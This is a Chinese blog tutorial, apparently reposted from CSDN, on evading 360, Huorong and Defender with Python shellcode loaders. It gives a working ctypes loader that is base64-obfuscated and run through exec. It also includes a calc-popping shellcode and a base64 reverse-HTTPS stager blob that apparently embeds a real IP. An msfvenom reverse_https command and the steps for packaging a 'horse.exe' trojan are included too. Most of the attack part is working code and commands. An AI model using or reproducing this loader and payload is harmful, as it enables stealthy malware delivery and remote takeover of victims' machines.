> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/yTmvLDsn0t04-6UpQvjMpA)

**0x01 简介**
===========

之前学习免杀都是使用 Metasploit 自带的编码进行，从未成功过。也使用过 GitHub 上别人提供的免杀方法，最近学习并实践发现绕过国内的杀毒软件貌似并不难，本文使用手工分析特征码，使用 base64 编码绕过杀毒软件静态分析。虽然使用的方法比较简单，但对实际做免杀及免杀研究还是有一定意义的。

**0x02 环境**
===========

```
Windows 10 x64
    Python 3.8.3
    Pyinstaller
    火绒版本：5.0.53.1，病毒库：2020-10-09
    360安全卫士：12.0.0.2003，备用木马库：2020-10-10
    360杀毒：5.0.0.8170
```

**0x03 原理**
===========

杀毒软件的原理一般是匹配特征码，行为监测，虚拟机（沙箱），内存查杀等。360 和火绒主要使用特征码检测查杀病毒（云查杀也是特征码检测），本文仅对 360、火绒和 Defender 进行特征码检测绕过，因为 Metasploit 和 CobaltStrike 生成的 shellcode 中包含内存大小检测、网卡地址检测、编码、时区感知和获取系统信息等功能，但有时功能太多反而容易被检测，如图：

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGT6Fwj6ucT3082yr0pPLGhpTYNDc4tlicSlrUjzP0JqTp0sBibEzLV1I8mWQWM1ebJuFLhcD6CaejA/640?wx_fmt=png)

因此，本文通过使用 base64 编码混淆代码来绕过特征检测。

**0x04 加载 ShellCode**
---------------------

在 C/C++ 语言中，通过申请内存将 shellcode 加载到内存中进行执行，在 Python 语言中通过 ctypes 模块将 shellcode 加载到内存并执行：

```
import ctypes
     
    shellcode = b''
    #调用kernel32.dll动态链接库中的VirtualAlloc函数申请内存，0x3000代表MEM_COMMIT | MEM_RESERVE，0x40代表可读可写可执行属性
    wiseZERld = ctypes.windll.kernel32.VirtualAlloc(  
        ctypes.c_int(0),
        ctypes.c_int(len(shellcode)),
        ctypes.c_int(0x3000),ctypes.c_int(0x40)
    )
    #调用kernel32.dll动态链接库中的RtlMoveMemory函数将shellcode移动到申请的内存中
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_int(wiseZERld),
        shellcode,
        ctypes.c_int(len(shellcode))
    )
    #创建线程并执行shellcode
    CVXWRcjqxL = ctypes.windll.kernel32.CreateThread( 
        ctypes.c_int(0),#指向安全属性的指针
        ctypes.c_int(0),#初始堆栈大小
        ctypes.c_int(wiseZERld),#指向起始地址的指针
        ctypes.c_int(0),#指向任何参数的指针
        ctypes.c_int(0),#创建标志
        ctypes.pointer(ctypes.c_int(0)))#指向接收线程标识符的值的指针
    ctypes.windll.kernel32.WaitForSingleObject(
        ctypes.c_int(CVXWRcjqxL),
        ctypes.c_int(-1)
    )
```

```
import ctypes
    shellcode = b''
    wiseZERld = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(wiseZERld),shellcode,ctypes.c_int(len(shellcode)))
    CVXWRcjqxL = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(CVXWRcjqxL),ctypes.c_int(-1))
```

**0x05 定位特征码** 
---------------

但上面的代码早已被提取特征码，杀毒软件会检测到，如图：

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGT6Fwj6ucT3082yr0pPLGhH6jbn0zReLWJFzKUze6dPxeBsdPPtiaWksicpxnWCD5Q7P01EJTibicwiaw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGT6Fwj6ucT3082yr0pPLGhfhjqXBL6SibrP4Dz7Os8Saic4Lz56PElSCibaG2MQicPynicjcsoGDoTyLA/640?wx_fmt=png)

由于代码较少，可通过手工逐行删除文件定位特征码，也可以直接处理所有代码。格式化代码：

```
import ctypes
import base64
 
#弹出计算器的shellcode
shellcode = b"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
shellcode += b"\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
shellcode += b"\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
shellcode += b"\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
shellcode += b"\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
shellcode += b"\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
shellcode += b"\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
shellcode += b"\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
shellcode += b"\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
shellcode += b"\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
shellcode += b"\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
shellcode += b"\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
shellcode += b"\x52\xff\xd0"
 
#将base64编码的代码进行解码
func=base64.b64decode(b'Cndpc2VaRVJsZCA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jKGN0eXBlcy5jX2ludCgwKSxjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpLGN0eXBlcy5jX2ludCgweDMwMDApLGN0eXBlcy5jX2ludCgweDQwKSkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX2ludCh3aXNlWkVSbGQpLHNoZWxsY29kZSxjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpKQpDVlhXUmNqcXhMID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoY3R5cGVzLmNfaW50KDApLGN0eXBlcy5jX2ludCgwKSxjdHlwZXMuY19pbnQod2lzZVpFUmxkKSxjdHlwZXMuY19pbnQoMCksY3R5cGVzLmNfaW50KDApLGN0eXBlcy5wb2ludGVyKGN0eXBlcy5jX2ludCgwKSkpCmN0eXBlcy53aW5kbGwua2VybmVsMzIuV2FpdEZvclNpbmdsZU9iamVjdChjdHlwZXMuY19pbnQoQ1ZYV1JjanF4TCksY3R5cGVzLmNfaW50KC0xKSkK')
 
#执行解码后的代码
exec(func)
```

```
import ctypes
    import base64
     
    shellcode = b'/OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8AdCLQHiFwHRKAdBQi0gYi1ggAdPjPEmLNIsB1jH/McCswc8NAcc44HX0A334O30kdeJYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS64ZdaG5ldABod2luaVRoTHcmB//V6AAAAAAx/1dXV1dXaDpWeaf/1emkAAAAWzHJUVFqA1FRaLsBAABTUGhXiZ/G/9VQ6YwAAABbMdJSaAAywIRSUlJTUlBo61UuO//VicaDw1BogDMAAIngagRQah9WaHVGnob/1V8x/1dXav9TVmgtBhh7/9WFwA+EygEAADH/hfZ0BIn56wloqsXiXf/VicFoRSFeMf/VMf9XagdRVlBot1fgC//VvwAvAAA5x3UHWFDpezH/6ZEBAADpyQEAAOhvL3RvQTgASxAMkZ+p7ep37I5nZavvutF74mh+EO6iWE1whnPY00prahcR88l6BRlQ2tZ2qYMonaSnUv2sS3XsZwgHjmoy9lJ2rFBHafwqBwBVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCgCx3pAWxJuOeBTHzyZoplYk5qGRd07sBDs1gKBLLqc31JKXE2Bg+u7zdbPzmb2d0o1ANOKDkOM7e/VFoExzSG4OT6aTL94KFI++kBzdhpngI2PRdk0NHxRk+3eCRZJMbt2wFm7ybK5GeHIil8J4FzH9EVDzDz35cuubp4MqOYiIgnQg3c4igbKiGXMYn1nOqhhfkn2VcWgXnyzjk2Ym0RaUP/dsb6bFfsIqN/JwQxTJ8BTOVX6JODn+XHWRnIWCIjrwyN0bhL9kbO46YIe7ZqOhDxQm4vwAaPC1olb/1WpAaAAQAABoAABAAFdoWKRT5f/Vk7kAAAAAAdlRU4nnV2gAIAAAU1ZoEpaJ4v/VhcB0xosHAcOFwHXlWMPoif3//zEwMS4xMzIuMTkzLjM3ABI0Vng='
     
    shellcode=base64.b64decode(shellcode)
     
    func=base64.b64decode(b'Cndpc2VaRVJsZCA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jKGN0eXBlcy5jX2ludCgwKSxjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpLGN0eXBlcy5jX2ludCgweDMwMDApLGN0eXBlcy5jX2ludCgweDQwKSkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX2ludCh3aXNlWkVSbGQpLHNoZWxsY29kZSxjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpKQpDVlhXUmNqcXhMID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoY3R5cGVzLmNfaW50KDApLGN0eXBlcy5jX2ludCgwKSxjdHlwZXMuY19pbnQod2lzZVpFUmxkKSxjdHlwZXMuY19pbnQoMCksY3R5cGVzLmNfaW50KDApLGN0eXBlcy5wb2ludGVyKGN0eXBlcy5jX2ludCgwKSkpCmN0eXBlcy53aW5kbGwua2VybmVsMzIuV2FpdEZvclNpbmdsZU9iamVjdChjdHlwZXMuY19pbnQoQ1ZYV1JjanF4TCksY3R5cGVzLmNfaW50KC0xKSkK')
     
    exec(func)
```

删除第三行或第四行后发现不再报毒，所以仅将这两句进行混淆就可以。

**0x06 Base64 编码绕过**
--------------------

这里选择混淆所有代码，使用 base64 将申请内存、载入 shellcode 和执行 shellcode 的函数进行编码，然后使用 exec 函数执行代码：

```
# -*- coding: UTF-8 -*-
    import ctypes
    import base64
     
    shellcode =  b""
     
     
    #设置函数VirtualAlloc的返回类型为c_int64
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_int64
     
    wiseZERld = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
     
    #将shellcode移动到申请的内存，起始地址为c_int64类型
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int64(wiseZERld),shellcode,ctypes.c_int(len(shellcode)))
     
    #创建线程并执行
    CVXWRcjqxL = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int64(wiseZERld),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(CVXWRcjqxL),ctypes.c_int(-1))
```

```
版权声明：本文为CSDN博主「江左盟宗主」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/qq_32261191/article/details/108994177
```

使用 msfvenom -p windows/meterpreter/reverse_https lhost=x.x.x.x lport=xxxx -b '\x00\x0a\x0d' -f python，生成 shellcode，替换程序中的 shellcode，然后使用 pyinstaller -F -w -i a3.ico horse.py 打包为 horse.exe。使用 VirusTotal 的检测，有 11 个引擎报毒，如图：

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGT6Fwj6ucT3082yr0pPLGhfRsJs35hcndu44bGibaH1g7LIsZgXLjeu52hFKBJt9c3ltJlbKoN21g/640?wx_fmt=png)

使用微步云沙箱检测，有 1 个报毒，但总体评估结果为安全，如图：

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGT6Fwj6ucT3082yr0pPLGhibUJgUOa9GuEQ9R1jntwomYgD4JWAlytZ6X4sJohZ72uoICMf8rktyA/640?wx_fmt=png)

使用 360 安全卫士扫描结果，如图：

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGT6Fwj6ucT3082yr0pPLGhicQOmLbnhaA5Rib3suWoPZ3lPJLlNbVibasRkwogZNAznKnfIAF7z3NpA/640?wx_fmt=png)

360 杀毒扫描结果，如图：

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGT6Fwj6ucT3082yr0pPLGhjmNow2K6fILXHkb2Sjqg9uxGiaDNWIYbe4IKDicIicfqHqqwia68RVWAGA/640?wx_fmt=png)

Defender 扫描结果，如图：

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGT6Fwj6ucT3082yr0pPLGhndp7YWelb2FGzsNeuE4UmM1MW8z6wn9NWtFo8haOBfFc25iarTICsibA/640?wx_fmt=png)

运行时 Defender 检测到威胁，如图：

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGT6Fwj6ucT3082yr0pPLGhzuGicR6XTqsxolSXJT0OVWSQ6Byt4D7yxfklpA0RvVNxWplicLtQb1Jg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGT6Fwj6ucT3082yr0pPLGhAbhx0zX11mLUiafYLPcMqG7iaqrrmofasfs4OBzGr4LkYCz46Oj12bvw/640?wx_fmt=png)

服务端建立连接，但被 Defender 拦截，如图：

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGT6Fwj6ucT3082yr0pPLGh6W73pYGiaH4Xv640Ldjc00pU35f8SibVPCpyibaODMIQVjA02xfYFoP2A/640?wx_fmt=png)

使用 CobaltStrike 生成的 payload 测试，360、火绒和 Defender 都检测不到，但使用 VirusTotal 检测有 22 个报毒，如图：

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGT6Fwj6ucT3082yr0pPLGhXaJTAl4nQHK6kkG9FyRicM3B5Jzcd90licw6XSrGvCyxU9EmznicBNorA/640?wx_fmt=png)

使用微步云沙箱检测结果为可疑，如图：

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGT6Fwj6ucT3082yr0pPLGhAezib6ITm6bsrGiaaP1wkMcnhKibibLO1tQ6ReOPWUBrMs7FnzXJBmVgCg/640?wx_fmt=png)

运行时 Defender 检测不到，成功获得连接，如图：

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGT6Fwj6ucT3082yr0pPLGhhdfJFKBHIsYozvugZiajZia7bgzH0Ion8mffv8XRGIBtfrYm5Xn1zHGA/640?wx_fmt=png)

 此时已成功免杀 360、火绒和 Defender。但 VirtusTotal 检测率还是有点高，使用 base64 编码 shellcode 减少特征码：

```
import ctypes
    import base64
    shellcode = b'/OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8AdCLQHiFwHRKAdBQi0gYi1ggAdPjPEmLNIsB1jH/McCswc8NAcc44HX0A334O30kdeJYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS64ZdaG5ldABod2luaVRoTHcmB//V6AAAAAAx/1dXV1dXaDpWeaf/1emkAAAAWzHJUVFqA1FRaLsBAABTUGhXiZ/G/9VQ6YwAAABbMdJSaAAywIRSUlJTUlBo61UuO//VicaDw1BogDMAAIngagRQah9WaHVGnob/1V8x/1dXav9TVmgtBhh7/9WFwA+EygEAADH/hfZ0BIn56wloqsXiXf/VicFoRSFeMf/VMf9XagdRVlBot1fgC//VvwAvAAA5x3UHWFDpezH/6ZEBAADpyQEAAOhvL3RvQTgASxAMkZ+p7ep37I5nZavvutF74mh+EO6iWE1whnPY00prahcR88l6BRlQ2tZ2qYMonaSnUv2sS3XsZwgHjmoy9lJ2rFBHafwqBwBVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCgCx3pAWxJuOeBTHzyZoplYk5qGRd07sBDs1gKBLLqc31JKXE2Bg+u7zdbPzmb2d0o1ANOKDkOM7e/VFoExzSG4OT6aTL94KFI++kBzdhpngI2PRdk0NHxRk+3eCRZJMbt2wFm7ybK5GeHIil8J4FzH9EVDzDz35cuubp4MqOYiIgnQg3c4igbKiGXMYn1nOqhhfkn2VcWgXnyzjk2Ym0RaUP/dsb6bFfsIqN/JwQxTJ8BTOVX6JODn+XHWRnIWCIjrwyN0bhL9kbO46YIe7ZqOhDxQm4vwAaPC1olb/1WpAaAAQAABoAABAAFdoWKRT5f/Vk7kAAAAAAdlRU4nnV2gAIAAAU1ZoEpaJ4v/VhcB0xosHAcOFwHXlWMPoif3//zEwMS4xMzIuMTkzLjM3ABI0Vng='
    shellcode=base64.b64decode(shellcode)
    func=base64.b64decode(b'Cndpc2VaRVJsZCA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jKGN0eXBlcy5jX2ludCgwKSxjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpLGN0eXBlcy5jX2ludCgweDMwMDApLGN0eXBlcy5jX2ludCgweDQwKSkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX2ludCh3aXNlWkVSbGQpLHNoZWxsY29kZSxjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpKQpDVlhXUmNqcXhMID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoY3R5cGVzLmNfaW50KDApLGN0eXBlcy5jX2ludCgwKSxjdHlwZXMuY19pbnQod2lzZVpFUmxkKSxjdHlwZXMuY19pbnQoMCksY3R5cGVzLmNfaW50KDApLGN0eXBlcy5wb2ludGVyKGN0eXBlcy5jX2ludCgwKSkpCmN0eXBlcy53aW5kbGwua2VybmVsMzIuV2FpdEZvclNpbmdsZU9iamVjdChjdHlwZXMuY19pbnQoQ1ZYV1JjanF4TCksY3R5cGVzLmNfaW50KC0xKSkK')
    exec(func)
```

再次进行检测，如图：

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGT6Fwj6ucT3082yr0pPLGh16XXl40BjhMKZRMHt5z7fSF9rXAWLNnl6SBJAWWQhUUNqXvQtEq96w/640?wx_fmt=png)

 还可以通过自定义的加密函数进行加密特征码从而绕过静态分析的杀毒软件，但混淆代码的免杀能力毕竟有限，新的特征码被提取只是时间问题。

某些 Python3 无法运行该代码，会报如下错误，如图：

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGT6Fwj6ucT3082yr0pPLGhwHICDUCmUPImz4zjsDNV9qG0P9XWhTUSbZeu0PU5NwvES4xPSgfvicA/640?wx_fmt=png)

但是换成 Python2 却可以执行，调试发现 python2 调用 VirtualAlloc 函数申请内存返回的结果数据是不超过 8 位的整数，而 python3 返回的结果是超过 8 位不超过 16 位的，通过搜索发现设置 VirtualAlloc 函数的返回类型和内存起始地址为 c_int64 或 c_uint64 类型即可：

```
# -*- coding: UTF-8 -*-
    import ctypes
    import base64
    shellcode =  b""
    #设置函数VirtualAlloc的返回类型为c_int64
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_int64
    wiseZERld = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
    #将shellcode移动到申请的内存，起始地址为c_int64类型
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int64(wiseZERld),shellcode,ctypes.c_int(len(shellcode)))
    #创建线程并执行
    CVXWRcjqxL = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int64(wiseZERld),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(CVXWRcjqxL),ctypes.c_int(-1))
```

```
版权声明：本文为CSDN博主「江左盟宗主」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/qq_32261191/article/details/108994177
```

**【往期推荐】**  

[未授权访问漏洞汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484804&idx=2&sn=519ae0a642c285df646907eedf7b2b3a&chksm=ea37fadedd4073c87f3bfa844d08479b2d9657c3102e169fb8f13eecba1626db9de67dd36d27&scene=21#wechat_redirect)

[【内网渗透】内网信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485796&idx=1&sn=8e78cb0c7779307b1ae4bd1aac47c1f1&chksm=ea37f63edd407f2838e730cd958be213f995b7020ce1c5f96109216d52fa4c86780f3f34c194&scene=21#wechat_redirect)  

[【内网渗透】域内信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485855&idx=1&sn=3730e1a1e851b299537db7f49050d483&chksm=ea37f6c5dd407fd353d848cbc5da09beee11bc41fb3482cc01d22cbc0bec7032a5e493a6bed7&scene=21#wechat_redirect)  

[记一次 HW 实战笔记 | 艰难的提权爬坑](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=2&sn=5368b636aed77ce455a1e095c63651e4&chksm=ea37f965dd407073edbf27256c022645fe2c0bf8b57b38a6000e5aeb75733e10815a4028eb03&scene=21#wechat_redirect)

[【超详细】Microsoft Exchange 远程代码执行漏洞复现【CVE-2020-17144】](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485992&idx=1&sn=18741504243d11833aae7791f1acda25&chksm=ea37f572dd407c64894777bdf77e07bdfbb3ada0639ff3a19e9717e70f96b300ab437a8ed254&scene=21#wechat_redirect)

[【超详细】Fastjson1.2.24 反序列化漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=1&sn=1178e571dcb60adb67f00e3837da69a3&chksm=ea37f965dd4070732b9bbfa2fe51a5fe9030e116983a84cd10657aec7a310b01090512439079&scene=21#wechat_redirect)

[【超详细】CVE-2020-14882 | Weblogic 未授权命令执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485550&idx=1&sn=921b100fd0a7cc183e92a5d3dd07185e&chksm=ea37f734dd407e22cfee57538d53a2d3f2ebb00014c8027d0b7b80591bcf30bc5647bfaf42f8&scene=21#wechat_redirect)  

[【奇淫巧技】如何成为一个合格的 “FOFA” 工程师](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485135&idx=1&sn=f872054b31429e244a6e56385698404a&chksm=ea37f995dd40708367700fc53cca4ce8cb490bc1fe23dd1f167d86c0d2014a0c03005af99b89&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

_**走过路过的大佬们留个关注再走呗**_![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEATexewVNVf8bbPg7wC3a3KR1oG1rokLzsfV9vUiaQK2nGDIbALKibe5yauhc4oxnzPXRp9cFsAg4Q/640?wx_fmt=png)

**往期文章有彩蛋哦****![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTHtVfEjbedItbDdJTEQ3F7vY8yuszc8WLjN9RmkgOG0Jp7QAfTxBMWU8Xe4Rlu2M7WjY0xea012OQ/640?wx_fmt=png)**

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTECbvcv6VpkwD7BV8iaiaWcXbahhsa7k8bo1PKkLXXGlsyC6CbAmE3hhSBW5dG65xYuMmR7PQWoLSFA/640?wx_fmt=png)